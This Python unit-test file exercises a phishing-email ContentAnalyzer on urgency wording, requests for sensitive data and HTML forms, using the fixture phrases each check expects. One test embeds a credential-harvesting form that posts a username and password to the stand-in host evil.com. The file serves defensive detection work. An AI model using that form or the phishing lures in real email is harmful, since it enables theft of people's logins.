"""Unit tests for ContentAnalyzer — urgency, sensitive data requests, HTML forms."""

from __future__ import annotations

import pytest

from detection_engine.analyzers.content import ContentAnalyzer
from detection_engine.domain.email import EmailData, EmailHeaders
from detection_engine.domain.enums import SignalCategory, SignalSeverity
from tests.email_fixtures import (
    BEC_WIRE_TRANSFER,
    EMPTY_MINIMAL,
    LEGIT_AMAZON_ORDER,
    LEGIT_MARKETING,
    MALWARE_ATTACHMENT,
    MASS_PHISHING,
    SPEAR_PHISH_COUSIN_DOMAIN,
    build_email_data,
)


def _make_email(
    subject: str = "Test",
    body_text: str = "",
    body_html: str = "",
) -> EmailData:
    return EmailData(
        message_id="test-001",
        sender="test@example.com",
        recipient="user@example.com",
        subject=subject,
        body_text=body_text,
        body_html=body_html,
        headers=EmailHeaders([("From", "test@example.com"), ("To", "user@example.com")]),
    )


@pytest.fixture
def analyzer() -> ContentAnalyzer:
    return ContentAnalyzer()


# ---------------------------------------------------------------------------
# CONTENT-1: Urgency / threat language
# ---------------------------------------------------------------------------


class TestUrgencyLanguage:
    def test_suspended_within_24_hours(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="Your account will be suspended within 24 hours.")
        output = analyzer.analyze(email)
        urgency = [s for s in output.signals if s.id == "urgency_language"]
        assert len(urgency) == 1
        assert urgency[0].severity == SignalSeverity.MEDIUM

    def test_immediate_action_required(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="Immediate action required to avoid closure.")
        output = analyzer.analyze(email)
        assert any(s.id == "urgency_language" for s in output.signals)

    def test_time_sensitive(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="This is time-sensitive and must be handled today.")
        output = analyzer.analyze(email)
        assert any(s.id == "urgency_language" for s in output.signals)

    def test_respond_immediately(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="Please respond immediately.")
        output = analyzer.analyze(email)
        assert any(s.id == "urgency_language" for s in output.signals)

    def test_service_interruption(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="To avoid service interruption, update now.")
        output = analyzer.analyze(email)
        assert any(s.id == "urgency_language" for s in output.signals)

    def test_subject_scanned_for_urgency(self, analyzer: ContentAnalyzer):
        email = _make_email(
            subject="Immediate action required",
            body_text="Please check your account.",
        )
        output = analyzer.analyze(email)
        assert any(s.id == "urgency_language" for s in output.signals)

    def test_benign_deadline_not_flagged(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="Your subscription expires on Friday.")
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "urgency_language"]

    def test_normal_shipping_not_flagged(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="Your order has shipped! Arriving Tuesday.")
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "urgency_language"]

    def test_multiple_matches_increase_confidence(self, analyzer: ContentAnalyzer):
        email = _make_email(
            body_text=(
                "Your account will be suspended within 24 hours. "
                "Immediate action required. This is time-sensitive."
            )
        )
        output = analyzer.analyze(email)
        signal = [s for s in output.signals if s.id == "urgency_language"][0]
        assert signal.confidence > 0.65

    def test_single_match_has_lower_confidence(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="This is time-sensitive.")
        output = analyzer.analyze(email)
        signal = [s for s in output.signals if s.id == "urgency_language"][0]
        assert signal.confidence == pytest.approx(0.65, abs=0.01)

    def test_only_one_urgency_signal_per_email(self, analyzer: ContentAnalyzer):
        email = _make_email(
            body_text="Account will be suspended. Service interruption. Respond immediately."
        )
        output = analyzer.analyze(email)
        assert len([s for s in output.signals if s.id == "urgency_language"]) == 1


# ---------------------------------------------------------------------------
# CONTENT-2: Sensitive data request
# ---------------------------------------------------------------------------


class TestSensitiveDataRequest:
    def test_verify_identity(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="Please verify your identity to continue.")
        output = analyzer.analyze(email)
        sensitive = [s for s in output.signals if s.id == "sensitive_data_request"]
        assert len(sensitive) == 1
        assert sensitive[0].severity == SignalSeverity.HIGH

    def test_update_payment(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="Please update your payment information.")
        output = analyzer.analyze(email)
        assert any(s.id == "sensitive_data_request" for s in output.signals)

    def test_bank_account_details(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="Please send your bank account details.")
        output = analyzer.analyze(email)
        assert any(s.id == "sensitive_data_request" for s in output.signals)

    def test_verify_password(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="You need to verify your password.")
        output = analyzer.analyze(email)
        assert any(s.id == "sensitive_data_request" for s in output.signals)

    def test_social_security(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="Please provide your social security number.")
        output = analyzer.analyze(email)
        assert any(s.id == "sensitive_data_request" for s in output.signals)

    def test_normal_account_reference_not_flagged(self, analyzer: ContentAnalyzer):
        email = _make_email(body_text="Your account balance is $150.00.")
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "sensitive_data_request"]

    def test_password_reset_notification_not_flagged(self, analyzer: ContentAnalyzer):
        email = _make_email(
            body_text="We received a request to reset the password for your account."
        )
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "sensitive_data_request"]

    def test_only_one_sensitive_signal_per_email(self, analyzer: ContentAnalyzer):
        email = _make_email(
            body_text="Verify your password and confirm your identity."
        )
        output = analyzer.analyze(email)
        assert len([s for s in output.signals if s.id == "sensitive_data_request"]) == 1


# ---------------------------------------------------------------------------
# CONTENT-3: HTML form in email body
# ---------------------------------------------------------------------------


class TestHtmlForm:
    def test_form_with_input_detected(self, analyzer: ContentAnalyzer):
        email = _make_email(
            body_html=(
                '<form action="http://evil.com/collect">'
                '<input type="text" name="user">'
                '<input type="password" name="pass">'
                "</form>"
            )
        )
        output = analyzer.analyze(email)
        form = [s for s in output.signals if s.id == "html_form_in_body"]
        assert len(form) == 1
        assert form[0].severity == SignalSeverity.CRITICAL
        assert form[0].confidence == 1.0

    def test_form_without_input_not_flagged(self, analyzer: ContentAnalyzer):
        email = _make_email(body_html="<form><p>No inputs here</p></form>")
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "html_form_in_body"]

    def test_input_without_form_not_flagged(self, analyzer: ContentAnalyzer):
        email = _make_email(
            body_html='<div><input type="text" name="search"></div>'
        )
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "html_form_in_body"]

    def test_empty_html_not_flagged(self, analyzer: ContentAnalyzer):
        email = _make_email(body_html="")
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "html_form_in_body"]

    def test_normal_html_email_not_flagged(self, analyzer: ContentAnalyzer):
        email = _make_email(
            body_html="<html><body><p>Hello world</p><a href='http://x.com'>Link</a></body></html>"
        )
        output = analyzer.analyze(email)
        assert not [s for s in output.signals if s.id == "html_form_in_body"]


# ---------------------------------------------------------------------------
# Score contribution
# ---------------------------------------------------------------------------


class TestScoreContribution:
    def test_all_signals_have_zero_contribution(self, analyzer: ContentAnalyzer):
        email = _make_email(
            subject="Immediate action required",
            body_text="Verify your identity immediately. Account will be suspended.",
            body_html='<form action="x"><input type="text"></form>',
        )
        output = analyzer.analyze(email)
        assert len(output.signals) == 3
        assert all(s.score_contribution == 0.0 for s in output.signals)


# ---------------------------------------------------------------------------
# Real fixtures
# ---------------------------------------------------------------------------


class TestRealFixtures:
    def test_mass_phishing_urgency_and_sensitive(self, analyzer: ContentAnalyzer):
        email = build_email_data(MASS_PHISHING["email"])
        output = analyzer.analyze(email)
        ids = {s.id for s in output.signals}
        assert "urgency_language" in ids
        assert "sensitive_data_request" in ids

    def test_spear_phish_urgency_and_sensitive(self, analyzer: ContentAnalyzer):
        email = build_email_data(SPEAR_PHISH_COUSIN_DOMAIN["email"])
        output = analyzer.analyze(email)
        ids = {s.id for s in output.signals}
        assert "urgency_language" in ids
        assert "sensitive_data_request" in ids

    def test_bec_has_urgency(self, analyzer: ContentAnalyzer):
        email = build_email_data(BEC_WIRE_TRANSFER["email"])
        output = analyzer.analyze(email)
        ids = {s.id for s in output.signals}
        assert "urgency_language" in ids

    def test_legit_amazon_no_signals(self, analyzer: ContentAnalyzer):
        email = build_email_data(LEGIT_AMAZON_ORDER["email"])
        output = analyzer.analyze(email)
        assert len(output.signals) == 0

    def test_legit_marketing_no_signals(self, analyzer: ContentAnalyzer):
        email = build_email_data(LEGIT_MARKETING["email"])
        output = analyzer.analyze(email)
        assert len(output.signals) == 0

    def test_malware_has_urgency(self, analyzer: ContentAnalyzer):
        email = build_email_data(MALWARE_ATTACHMENT["email"])
        output = analyzer.analyze(email)
        ids = {s.id for s in output.signals}
        assert "urgency_language" in ids

    def test_empty_minimal_no_signals(self, analyzer: ContentAnalyzer):
        email = build_email_data(EMPTY_MINIMAL["email"])
        output = analyzer.analyze(email)
        assert len(output.signals) == 0
